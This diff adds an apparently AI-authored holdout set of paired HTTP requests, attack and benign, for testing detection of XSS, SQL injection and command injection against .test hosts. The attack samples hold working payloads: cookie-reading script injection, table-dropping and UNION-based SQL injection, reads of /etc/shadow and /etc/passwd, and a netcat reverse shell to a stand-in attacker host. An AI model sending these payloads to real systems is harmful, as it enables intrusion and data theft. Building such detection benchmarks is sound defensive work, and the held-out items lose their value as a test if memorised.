@@ -1,0 +1,217 @@
+#@@ bundle aegisforge-holdout offline HTTP requests (AI-authored, human_review pending; see ../manifest.json)
+#@@ HOLDOUT: do not read during rule/prompt development. Hosts use reserved .test names and
+#@@ documentation IP ranges only; requests are never sent.
+
+#@@ sample HTTP-XSS-05-A
+GET /blog/%3Csvg%20onload%3Dalert(1)%3E HTTP/1.1
+Host: news.example.test
+Accept: text/html
+
+#@@ sample HTTP-XSS-05-N
+GET /blog/2026-11-05-release-notes HTTP/1.1
+Host: news.example.test
+Accept: text/html
+
+#@@ sample HTTP-XSS-06-A
+GET /help HTTP/1.1
+Host: support.example.test
+Referer: https://partner.example.test/"><img src=x onerror=alert(document.cookie)>
+Accept: text/html
+
+#@@ sample HTTP-XSS-06-N
+GET /help HTTP/1.1
+Host: support.example.test
+Referer: https://partner.example.test/docs/getting-started?ref=nav
+Accept: text/html
+
+#@@ sample HTTP-XSS-07-A
+POST /api/widgets HTTP/1.1
+Host: dashboard.example.test
+Content-Type: application/json
+
+{"widget": {"title": "Sales", "style": {"color": "red\" autofocus onfocus=\"alert(1)"}}}
+
+#@@ sample HTTP-XSS-07-N
+POST /api/widgets HTTP/1.1
+Host: dashboard.example.test
+Content-Type: application/json
+
+{"widget": {"title": "The \"Q3\" sales chart", "style": {"color": "#c0392b"}}}
+
+#@@ sample HTTP-XSS-08-A
+GET /search?q=%3CScRiPt%3Ealert%28origin%29%3C%2FsCrIpT%3E HTTP/1.1
+Host: docs.example.test
+Accept: text/html
+
+#@@ sample HTTP-XSS-08-N
+GET /search?q=for+x+in+range%2810%29%3A+print%28x%29 HTTP/1.1
+Host: docs.example.test
+Accept: text/html
+
+#@@ sample HTTP-XSS-09-A
+POST /posts HTTP/1.1
+Host: forum.example.test
+Content-Type: application/x-www-form-urlencoded
+
+title=Hello&body=%3Ciframe+srcdoc%3D%22%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B%22%3E%3C%2Fiframe%3E
+
+#@@ sample HTTP-XSS-09-N
+POST /posts HTTP/1.1
+Host: forum.example.test
+Content-Type: application/x-www-form-urlencoded
+
+title=Embedding+videos&body=Use+the+iframe+embed+code+from+the+video+page.
+
+#@@ sample HTTP-XSS-10-A
+GET /out?to=data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D HTTP/1.1
+Host: links.example.test
+Accept: text/html
+
+#@@ sample HTTP-XSS-10-N
+GET /out?to=https%3A%2F%2Fdocs.example.test%2Fguide HTTP/1.1
+Host: links.example.test
+Accept: text/html
+
+#@@ sample HTTP-SQLI-05-A
+GET /orders?id=7%3B%20DROP%20TABLE%20orders-- HTTP/1.1
+Host: shop.example.test
+Accept: application/json
+
+#@@ sample HTTP-SQLI-05-N
+GET /notes?q=milk%3B+eggs%3B+bread HTTP/1.1
+Host: shop.example.test
+Accept: application/json
+
+#@@ sample HTTP-SQLI-06-A
+POST /login HTTP/1.1
+Host: intranet.example.test
+Content-Type: application/x-www-form-urlencoded
+
+username=admin%27--&password=anything
+
+#@@ sample HTTP-SQLI-06-N
+POST /login HTTP/1.1
+Host: intranet.example.test
+Content-Type: application/x-www-form-urlencoded
+
+username=j.doe&password=Lake--Shore-77
+
+#@@ sample HTTP-SQLI-07-A
+POST /api/accounts/balance HTTP/1.1
+Host: bank.example.test
+Content-Type: application/json
+
+{"account_id": "1 OR 1=1"}
+
+#@@ sample HTTP-SQLI-07-N
+POST /api/accounts/balance HTTP/1.1
+Host: bank.example.test
+Content-Type: application/json
+
+{"account_id": "1042", "memo": "split 3 = 1 + 2 between us"}
+
+#@@ sample HTTP-SQLI-08-A
+GET /products?sort=(SELECT%20CASE%20WHEN%20(1%3D1)%20THEN%20price%20ELSE%20name%20END) HTTP/1.1
+Host: shop.example.test
+Accept: application/json
+
+#@@ sample HTTP-SQLI-08-N
+GET /products?sort=price,-created_at HTTP/1.1
+Host: shop.example.test
+Accept: application/json
+
+#@@ sample HTTP-SQLI-09-A
+GET /api/me HTTP/1.1
+Host: api.example.test
+X-Forwarded-For: 1' AND extractvalue(1,concat(0x7e,version()))-- -
+Accept: application/json
+
+#@@ sample HTTP-SQLI-09-N
+GET /api/me HTTP/1.1
+Host: api.example.test
+X-Forwarded-For: 203.0.113.7, 198.51.100.2
+Accept: application/json
+
+#@@ sample HTTP-SQLI-10-A
+GET /items/0%20UNION%20SELECT%200x61646d696e,0x70617373 HTTP/1.1
+Host: shop.example.test
+Accept: application/json
+
+#@@ sample HTTP-SQLI-10-N
+GET /items/0x7f3a9c HTTP/1.1
+Host: shop.example.test
+Accept: application/json
+
+#@@ sample HTTP-CMDI-05-A
+GET /tools/nslookup?domain=example.test%0Aid HTTP/1.1
+Host: admin.example.test
+Accept: application/json
+
+#@@ sample HTTP-CMDI-05-N
+GET /feedback?comment=Line+one%0ALine+two HTTP/1.1
+Host: admin.example.test
+Accept: application/json
+
+#@@ sample HTTP-CMDI-06-A
+POST /tools/archive HTTP/1.1
+Host: admin.example.test
+Content-Type: application/x-www-form-urlencoded
+
+path=%2Ftmp%2Fmissing+%7C%7C+cat+%2Fetc%2Fshadow
+
+#@@ sample HTTP-CMDI-06-N
+POST /tools/archive HTTP/1.1
+Host: admin.example.test
+Content-Type: application/x-www-form-urlencoded
+
+path=%2Fsrv%2Fdata&note=keep+daily+%7C%7C+weekly
+
+#@@ sample HTTP-CMDI-07-A
+POST /api/convert HTTP/1.1
+Host: media.example.test
+Content-Type: application/json
+
+{"file": "a.png;cat${IFS}/etc/passwd"}
+
+#@@ sample HTTP-CMDI-07-N
+POST /api/convert HTTP/1.1
+Host: media.example.test
+Content-Type: application/json
+
+{"file": "report.png", "note": "use ${HOME}/exports as target"}
+
+#@@ sample HTTP-CMDI-08-A
+POST /api/diagnostics HTTP/1.1
+Host: win.example.test
+Content-Type: text/plain
+
+host=10.0.0.5 & ping -n 30 127.0.0.1
+
+#@@ sample HTTP-CMDI-08-N
+POST /api/diagnostics HTTP/1.1
+Host: win.example.test
+Content-Type: text/plain
+
+Status update: database & cache are healthy.
+
+#@@ sample HTTP-CMDI-09-A
+GET /api/version HTTP/1.1
+Host: api.example.test
+X-Client-Version: 2.4.1 | nc attacker.example.test 4444 -e /bin/sh
+Accept: application/json
+
+#@@ sample HTTP-CMDI-09-N
+GET /api/version HTTP/1.1
+Host: api.example.test
+X-Client-Version: 2.4.1|build-8812
+Accept: application/json
+
+#@@ sample HTTP-CMDI-10-A
+GET /tools/ping?host=127.0.0.1%3Bw%27h%27o%27a%27mi HTTP/1.1
+Host: admin.example.test
+Accept: application/json
+
+#@@ sample HTTP-CMDI-10-N
+GET /files?path=C%3A%5CUsers%5CPublic%5Creport.txt HTTP/1.1
+Host: admin.example.test
+Accept: application/json
